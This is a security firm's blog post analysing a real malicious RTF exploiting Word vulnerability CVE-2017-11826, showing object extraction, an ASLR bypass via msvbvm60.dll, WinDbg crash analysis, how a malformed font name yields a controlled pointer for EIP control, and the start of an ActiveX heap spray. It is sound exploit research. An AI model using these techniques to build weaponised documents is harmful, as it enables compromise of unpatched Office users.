![Cybersecurity blog header](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_blur.jpg)

[Home](https://www.tarlogic.com)
/
[Blog](https://www.tarlogic.com/blog/)
/
Exploiting Word: CVE-2017-11826

# Exploiting Word: CVE-2017-11826

11 - Dec - 2017
- Javier Gil

Table of Contents

* [0x01 ‚Äì Initial analysis of the sample with CVE-2017-11826](#0x01_%E2%80%93_Initial_analysis_of_the_sample_with_CVE-2017-11826 "0x01 ‚Äì Initial analysis of the sample with CVE-2017-11826")
* [0x02 ‚Äì Analysis of the vulnerabilty](#0x02_%E2%80%93_Analysis_of_the_vulnerabilty "0x02 ‚Äì Analysis of the vulnerabilty")
* [0x03 ‚Äì Analysis of the heap spray](#0x03_%E2%80%93_Analysis_of_the_heap_spray "0x03 ‚Äì Analysis of the heap spray")
* [0x04 ‚Äì Creating the matryoska](#0x04_%E2%80%93_Creating_the_matryoska "0x04 ‚Äì Creating the matryoska")
  + [Modifying activex1.bin](#Modifying_activex1bin "Modifying activex1.bin")
  + [Modifying document.xml](#Modifying_documentxml "Modifying document.xml")
  + [Creating the ZIPs/DOCX](#Creating_the_ZIPsDOCX "Creating the ZIPs/DOCX")
  + [Creating the CDFs](#Creating_the_CDFs "Creating the CDFs")
  + [Modifying the RTF file](#Modifying_the_RTF_file "Modifying the RTF file")
  + [PoK (Proof of Kaboom)](#PoK_Proof_of_Kaboom "PoK (Proof of Kaboom)")
* [0x05 ‚Äì Creating our payload](#0x05_%E2%80%93_Creating_our_payload "0x05 ‚Äì Creating our payload")
* [0x06 ‚Äì Final words](#0x06_%E2%80%93_Final_words "0x06 ‚Äì Final words")

Coincidentially with the beginning of an [APT simulation](https://www.tarlogic.com/blog/apt-intrusion-test/) engagement in the [Red Teaming](https://www.tarlogic.com/red-team-services/), a patch was issued my Microsoft fixing some vulnerabilities (CVE-2017-11826) affecting MS Office. The patch, which fixed a memory corruption bug, was first published on October 10th. On October 11th, Quihoo 360 Core Security reported having found malware exploiting said vulnerability during the previous month.

Due to the existence of public malware samples exploiting this vulnerability and the time lapse between the release of the patch and it being applied, it was decided to begin the engagement by exploiting this vulnerability. In this post we will briefly describe the contents of the Word exploit sample, and we will explain how we can modify it to our benefit, allowing us to deploy our custom APT solution.

## 0x01 ‚Äì Initial analysis of the sample with CVE-2017-11826

The sample is a RTF file. After analyzing its contents, we found the following components:

```
$ rtfobj cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5
rtfobj 0.51 - https://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5' - size: 680268 bytes
---+----------+-------------------------------+-------------------------------
id |index     |OLE Object                     |OLE Package
---+----------+-------------------------------+-------------------------------
0  |0003972Dh |format_id: 1 (Linked)          |Not an OLE Package
   |          |class name: ''                 |
   |          |data size: N/A                 |
---+----------+-------------------------------+-------------------------------
1  |00039807h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 53248               |
---+----------+-------------------------------+-------------------------------
2  |000538E9h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 14336               |
---+----------+-------------------------------+-------------------------------
```

If we dump the contents of the RTF file and look for the three objects, we find the following:

```
$ python2 rtf.py --input cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5 --dump
[...]
        object
        objemb
            *
            oleclsid
            '7bD5DE8D20-5BB8-11D1-A1E3-00A0C90F2731
            '7d
            *
            objdata 010500000100000001000000000000000000000000000000000000000000000000000000000000000000000000
            result
                pict
                wmetafile8
                picw1
                pich1

        object
        objemb
        objsetsize
        objw9361
        objh764
            *
            objclass Word.Document.12
            *
            objdata 010500000200000011000000576f72642e446f63756d656e742e313200000000000000000000d00000d0cf11e0a1b11ae
[...]
        object
        objemb
        objsetsize
        objw9361
        objh764
            *
            objclass Word.Document.12
            *
            objdata 010500000200000011000000576f72642e446f63756d656e742e313200000000000000000000380000d0cf11e0a1b11ae1
```

The first object loads the library identified by the CLSID D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731. We can look for it in the Windows registry to know which module it points to:

```
C:Usersjavier.gil>reg query HKEY_CLASSES_ROOT /F "D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731" /c /s

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}

End of search: 1 match(es) found.

C:Usersjavier.gil>reg query HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}
    (Default)    REG_SZ    VBPropertyBag

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}InProcServer32

C:Usersjavier.gil>reg query HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}InProcServer32

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}InProcServer32
    (Default)    REG_SZ    C:WindowsSysWOW64msvbvm60.dll
    ThreadingModel    REG_SZ    Apartment
```

This will make Word load that library in memory. Why is it so special?

[![msvbvm60 with no ASLR](data:image/gif;base64...)](https://www.tarlogic.com/wp-content/uploads/2017/12/no_aslr.png) msvbvm60 with no ASLR

So, by loading this module there will be known code at a fixed address, which is a nice ASLR bypass.

The two remaining objects are Word files. We can use rtfobj to extract them:

```
$ rtfobj -s all cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5
rtfobj 0.51 - https://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5' - size: 680268 bytes
---+----------+-------------------------------+-------------------------------
id |index     |OLE Object                     |OLE Package
---+----------+-------------------------------+-------------------------------
0  |0003972Dh |format_id: 1 (Linked)          |Not an OLE Package
   |          |class name: ''                 |
   |          |data size: N/A                 |
---+----------+-------------------------------+-------------------------------
1  |00039807h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 53248               |
---+----------+-------------------------------+-------------------------------
2  |000538E9h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 14336               |
---+----------+-------------------------------+-------------------------------
Saving raw data in object #0:
  saving object to file cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_0003972D.raw
Saving file embedded in OLE object #1:
  format_id  = 2
  class name = 'Word.Document.12'
  data size  = 53248
  saving to file cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc
Saving file embedded in OLE object #2:
  format_id  = 2
  class name = 'Word.Document.12'
  data size  = 14336
  saving to file cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc

$ l
total 748K
drwxr-xr-x  2 i i 4.0K Nov 30 11:27 .
drwxr-xr-x 11 i i 4.0K Nov 30 11:27 ..
-rw-r--r--  1 i i 665K Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5
-rw-r--r--  1 i i   45 Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_0003972D.raw
-rw-r--r--  1 i i  52K Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc
-rw-r--r--  1 i i  14K Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc

$ file *
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5:                     Rich Text Format data, version 1, unknown character set
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_0003972D.raw: locale data table
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc: Composite Document File V2 Document, Cannot read section info
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc: Composite Document File V2 Document, Cannot read section info

$ unzip cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc -d 00039807.doc                                                                                                                             [55/515]
Archive:  cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc
warning [cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc]:  1536 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: 00039807.doc/docProps/app.xml
  inflating: 00039807.doc/docProps/core.xml
   creating: 00039807.doc/word/activeX/
  inflating: 00039807.doc/word/activeX/activeX1.bin
  inflating: 00039807.doc/word/activeX/activeX1.xml
  inflating: 00039807.doc/word/activeX/activeX10.xml
  inflating: 00039807.doc/word/activeX/activeX11.xml
  inflating: 00039807.doc/word/activeX/activeX12.xml
  inflating: 00039807.doc/word/activeX/activeX13.xml
  inflating: 00039807.doc/word/activeX/activeX14.xml
  inflating: 00039807.doc/word/activeX/activeX15.xml
  inflating: 00039807.doc/word/activeX/activeX16.xml
  inflating: 00039807.doc/word/activeX/activeX17.xml
  inflating: 00039807.doc/word/activeX/activeX18.xml
  inflating: 00039807.doc/word/activeX/activeX19.xml
  inflating: 00039807.doc/word/activeX/activeX2.xml
  inflating: 00039807.doc/word/activeX/activeX20.xml
  inflating: 00039807.doc/word/activeX/activeX21.xml
  inflating: 00039807.doc/word/activeX/activeX22.xml
  inflating: 00039807.doc/word/activeX/activeX23.xml
  inflating: 00039807.doc/word/activeX/activeX24.xml
  inflating: 00039807.doc/word/activeX/activeX25.xml
  inflating: 00039807.doc/word/activeX/activeX26.xml
  inflating: 00039807.doc/word/activeX/activeX27.xml
  inflating: 00039807.doc/word/activeX/activeX28.xml
  inflating: 00039807.doc/word/activeX/activeX29.xml
  inflating: 00039807.doc/word/activeX/activeX3.xml
  inflating: 00039807.doc/word/activeX/activeX30.xml
  inflating: 00039807.doc/word/activeX/activeX31.xml
  inflating: 00039807.doc/word/activeX/activeX32.xml
  inflating: 00039807.doc/word/activeX/activeX33.xml
  inflating: 00039807.doc/word/activeX/activeX34.xml
  inflating: 00039807.doc/word/activeX/activeX35.xml
  inflating: 00039807.doc/word/activeX/activeX36.xml
  inflating: 00039807.doc/word/activeX/activeX37.xml
  inflating: 00039807.doc/word/activeX/activeX38.xml
  inflating: 00039807.doc/word/activeX/activeX39.xml
  inflating: 00039807.doc/word/activeX/activeX4.xml
  inflating: 00039807.doc/word/activeX/activeX40.xml
  inflating: 00039807.doc/word/activeX/activeX5.xml
  inflating: 00039807.doc/word/activeX/activeX6.xml
  inflating: 00039807.doc/word/activeX/activeX7.xml
  inflating: 00039807.doc/word/activeX/activeX8.xml
  inflating: 00039807.doc/word/activeX/activeX9.xml
   creating: 00039807.doc/word/activeX/_rels/
  inflating: 00039807.doc/word/activeX/_rels/activeX1.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX10.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX11.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX12.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX13.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX14.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX15.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX16.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX17.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX18.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX19.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX2.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX20.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX21.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX22.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX23.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX24.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX25.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX26.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX27.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX28.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX29.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX3.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX30.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX31.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX32.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX33.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX34.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX35.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX36.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX37.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX38.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX39.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX4.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX40.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX5.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX6.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX7.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX8.xml.rels
  inflating: 00039807.doc/word/activeX/_rels/activeX9.xml.rels
  inflating: 00039807.doc/word/document.xml
  inflating: 00039807.doc/word/fontTable.xml
  inflating: 00039807.doc/word/media/image1.wmf
  inflating: 00039807.doc/word/settings.xml
  inflating: 00039807.doc/word/styles.xml
  inflating: 00039807.doc/word/theme/theme1.xml
  inflating: 00039807.doc/word/webSettings.xml
  inflating: 00039807.doc/word/_rels/document.xml.rels
  inflating: 00039807.doc/[Content_Types].xml
  inflating: 00039807.doc/_rels/.rels

$ unzip cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc -d 000538E9.doc
Archive:  cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc
warning [cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc]:  1536 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: 000538E9.doc/docProps/app.xml
  inflating: 000538E9.doc/docProps/core.xml
  inflating: 000538E9.doc/word/document.xml
  inflating: 000538E9.doc/word/endnotes.xml
  inflating: 000538E9.doc/word/fontTable.xml
  inflating: 000538E9.doc/word/footnotes.xml
  inflating: 000538E9.doc/word/settings.xml
  inflating: 000538E9.doc/word/styles.xml
  inflating: 000538E9.doc/word/theme/theme1.xml
  inflating: 000538E9.doc/word/webSettings.xml
  inflating: 000538E9.doc/word/_rels/document.xml.rels
  inflating: 000538E9.doc/[Content_Types].xml
  inflating: 000538E9.doc/_rels/.rels
```

unzip warns us that there are 1536 extra bytes at the beginning of both ZIP files. This is because objects embeded in RTF files are not docx, but CDF instead. CDF is a file format created by Microsoft, which is basically a file container. (https://en.wikipedia.org/wiki/Compound\_File\_Binary\_Format)

We will see how to handle that kind of files later, but for now lets keep analyzing those Word documents.

## 0x02 ‚Äì Analysis of the vulnerabilty

This file has very little content. We can start by examining document.xml:

```
$ xmllint word/document.xml
word/document.xml:7: parser error : Opening and ending tag mismatch: font line 6 and OLEObject
 &lt;/o:OLEObject>
 ^
word/document.xml:8: parser error : Opening and ending tag mismatch: OLEObject line 5 and shapeDefaults
 &lt;/w:shapeDefaults>
 ^
word/document.xml:9: parser error : Opening and ending tag mismatch: shapeDefaults line 4 and body
 &lt;/w:body>
 ^
word/document.xml:10: parser error : Opening and ending tag mismatch: body line 3 and document
&lt;/w:document>
 ^
word/document.xml:10: parser error : Premature end of data in tag document line 2
&lt;/w:document>

```

It seems it is a malformed file, as it has some non-matching XML tags.

```
$ cat word/document.xml
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?>
&lt;w:document xmlns:ve="https://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="https://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="https://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp="https://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="https://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wne="https://schemas.microsoft.com/office/word/2006/wordml">
 &lt;w:body >
 &lt;w:shapeDefaults >
 &lt;o:OLEObject >
 &lt;w:font w:name="LincerCharCharË£¨‡¢àfontÔºöbatang">&lt;o:idmap/>
 &lt;/o:OLEObject>
 &lt;/w:shapeDefaults>
 &lt;/w:body>
&lt;/w:document>

```

We can see that the tag is closed with . Also, there are some weird characters in between:

```
[0x00000000 0% 2304 word/document.xml]> xc
- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF0123456789ABCDEF comment
[...]
0x000002a0 6175 6c74 7320 3e0d 0a09 0909 3c6f 3a4f 4c45 4f62 6a65 6374 203e 0d0a 0909 0909 aults >.....&lt;o:OLEObject >......
0x000002c0 3c77 3a66 6f6e 7420 773a 6e61 6d65 3d22 4c69 6e63 6572 4368 6172 4368 6172 e8a3 &lt;w:font w:name="LincerCharChar..
0x000002e0 ace0 a288 666f 6e74 efbc 9a62 6174 616e 6722 3e3c 6f3a 6964 6d61 702f 3e0d 0a09 ....font...batang">&lt;o:idmap/>...
0x00000300 0909 3c2f 6f3a 4f4c 454f 626a 6563 743e 0d0a 0909 3c2f 773a 7368 6170 6544 6566 ..&lt;/o:OLEObject>....&lt;/w:shapeDef
0x00000320 6175 6c74 733e 0d0a 093c 2f77 3a62 6f64 793e 0d0a 3c2f 773a 646f 6375 6d65 6e74 aults>...&lt;/w:body>..&lt;/w:document
0x00000340 3eff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff ffff >...............................
```

We note the bytes e8a3ace0a288 for later.

Lets do a quick WinDbg session of the execution of the exploit. To do so, open the RTF file and attach it in WinDbg.

```
0:014> g
ModLoad: 69700000 6978c000   C:WindowsSysWOW64UIAutomationCore.DLL
ModLoad: 75510000 75515000   C:Windowssyswow64PSAPI.DLL
ModLoad: 696c0000 696fc000   C:WindowsSysWOW64OLEACC.dll
(814.e80): Unknown exception - code e0000002 (first chance)
ModLoad: 69680000 696b1000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT532.CNV
ModLoad: 69660000 6967f000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
ModLoad: 69630000 6965f000   SHDOCVW.dll
ModLoad: 69600000 6962f000   C:WindowsSysWOW64shdocvw.dll
ModLoad: 69680000 696be000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT632.CNV
ModLoad: 69640000 6965f000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
ModLoad: 69640000 69671000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT532.CNV
ModLoad: 696a0000 696bf000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
ModLoad: 69640000 6967e000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVWPFT632.CNV
ModLoad: 69680000 6969f000   C:Program Files (x86)Common FilesMicrosoft SharedTEXTCONVmsconv97.dll
(814.e80): Unknown exception - code e0000002 (first chance)
(814.e80): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Microsoft OfficeOffice15wwlib.dll -
eax=088888ec ebx=00000000 ecx=088888ec edx=00000004 esi=0937b008 edi=0938854c
eip=6f6c82a3 esp=0029457c ebp=002945e8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
wwlib!DllGetLCID+0x2e1e19:
6f6c82a3 8b08            mov     ecx,dword ptr [eax]  ds:002b:088888ec=????????
```

It seems there is something wrong in the exploit, as the process is crashing when attempting to read from an invalid memory address. Some context:

```
0:000> ub;u
wwlib!DllGetLCID+0x2e1dfc:
6f6c8286 0f84d268e9ff    je      wwlib!DllGetLCID+0x1786d4 (6f55eb5e)
6f6c828c 8b4944          mov     ecx,dword ptr [ecx+44h]
6f6c828f 85c9            test    ecx,ecx
6f6c8291 0f84c768e9ff    je      wwlib!DllGetLCID+0x1786d4 (6f55eb5e)
6f6c8297 8b4744          mov     eax,dword ptr [edi+44h]
6f6c829a 894844          mov     dword ptr [eax+44h],ecx
6f6c829d 8b4744          mov     eax,dword ptr [edi+44h]
6f6c82a0 8b4044          mov     eax,dword ptr [eax+44h]
wwlib!DllGetLCID+0x2e1e19:
6f6c82a3 8b08            mov     ecx,dword ptr [eax]
6f6c82a5 50              push    eax
6f6c82a6 ff5104          call    dword ptr [ecx+4]
6f6c82a9 e9b068e9ff      jmp     wwlib!DllGetLCID+0x1786d4 (6f55eb5e)
6f6c82ae 83f802          cmp     eax,2
6f6c82b1 750f            jne     wwlib!DllGetLCID+0x2e1e38 (6f6c82c2)
6f6c82b3 8d4624          lea     eax,[esi+24h]
6f6c82b6 50              push    eax
```

The function seems to be loading an object from eax and then calling a method at offset 0x04, passing its own reference in eax.

Where does the value 0x088888ec come from? Why is Word crashing? Lets look back at the value we found in document.xml: e8a3ace0a288. Are they related?

Office XML files are UTF-8 encoded. However, Windows apps use UTF-16 internally:

```
$ python2
Python 2.7.14 (default, Sep 20 2017, 01:25:59)
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct
>>> x = "e8a3ace0a288".decode("hex")
>>> unicode(x.decode("utf-8")).encode("utf-16-le")
'xecx88x88x08'
>>> hex(struct.unpack("<L", "xecx88x88x08")[0])
'0x88888ec'
```

Bingo :)

So, if we modify this value we can make Word execute the following instructions. Lets set EAX = X:

```
6f6c82a3 8b08            mov     ecx,dword ptr [X]
6f6c82a5 50              push    X
6f6c82a6 ff5104          call    dword ptr [X+4]
```

Therefore, if we want to control EIP (which we certainly do), we need to put the following data in a controlled memory address:

```
Direcci√≥n    Valor
X            X
X + 4        EIP objetivo
```

How can we meet this conditions? The sample‚Äôs authors made it by using a heap spray.

## 0x03 ‚Äì Analysis of the heap spray

When we looked at the contents of the first object, cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5\_object\_00039807.doc, the pressence of 40 activeX objects immediately caught our attention. This reminds us of [the classic Office heap spraying technique](https://www.greyhathacker.net/?p=911).

Lets examine document.xml, which describes the contents of the file:

```
[...]
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1060" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId6" w:name="Image117" w:shapeid="_x0000_i1060"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1058" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId7" w:name="Image116" w:shapeid="_x0000_i1058"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1056" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId8" w:name="Image115" w:shapeid="_x0000_i1056"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1054" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId9" w:name="Image114" w:shapeid="_x0000_i1054"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
 &lt;w:object w:dxaOrig="1440" w:dyaOrig="1440">
 &lt;v:shape id="_x0000_i1052" type="#_x0000_t75" style="width:1in;height:1in" o:ole="">
 &lt;v:imagedata r:id="rId4" o:title=""/>
 &lt;/v:shape>
 &lt;w:control r:id="rId10" w:name="Image113" w:shapeid="_x0000_i1052"/>
 &lt;/w:object>
 &lt;/w:r>
 &lt;w:r>
[...]
```

Its contents have been trimmed here to avoid making this post excessively long, but the original one has several embeded controls (from rId5 to rId44). This is the content of word/\_rels/document.xml.rels:

```
&lt;Relationships xmlns="https://schemas.openxmlformats.org/package/2006/relationships">
 &lt;Relationship Id="rId8" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX4.xml"/>
 &lt;Relationship Id="rId13" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX9.xml"/>
 &lt;Relationship Id="rId18" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX14.xml"/>
 &lt;Relationship Id="rId26" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX22.xml"/>
 &lt;Relationship Id="rId39" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX35.xml"/>
 &lt;Relationship Id="rId3" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/>
 &lt;Relationship Id="rId21" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX17.xml"/>
 &lt;Relationship Id="rId34" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX30.xml"/>
 &lt;Relationship Id="rId42" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX38.xml"/>
 &lt;Relationship Id="rId7" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX3.xml"/>
 &lt;Relationship Id="rId12" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX8.xml"/>
 &lt;Relationship Id="rId17" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX13.xml"/>
 &lt;Relationship Id="rId25" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX21.xml"/>
 &lt;Relationship Id="rId33" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX29.xml"/>
 &lt;Relationship Id="rId38" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX34.xml"/>
 &lt;Relationship Id="rId46" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
 &lt;Relationship Id="rId2" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
 &lt;Relationship Id="rId16" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX12.xml"/>
 &lt;Relationship Id="rId20" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX16.xml"/>
 &lt;Relationship Id="rId29" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX25.xml"/>
 &lt;Relationship Id="rId41" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX37.xml"/>
 &lt;Relationship Id="rId1" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
 &lt;Relationship Id="rId6" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX2.xml"/>
 &lt;Relationship Id="rId11" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX7.xml"/>
 &lt;Relationship Id="rId24" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX20.xml"/>
 &lt;Relationship Id="rId32" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX28.xml"/>
 &lt;Relationship Id="rId37" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX33.xml"/>
 &lt;Relationship Id="rId40" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX36.xml"/>
 &lt;Relationship Id="rId45" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/>
 &lt;Relationship Id="rId5" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/>
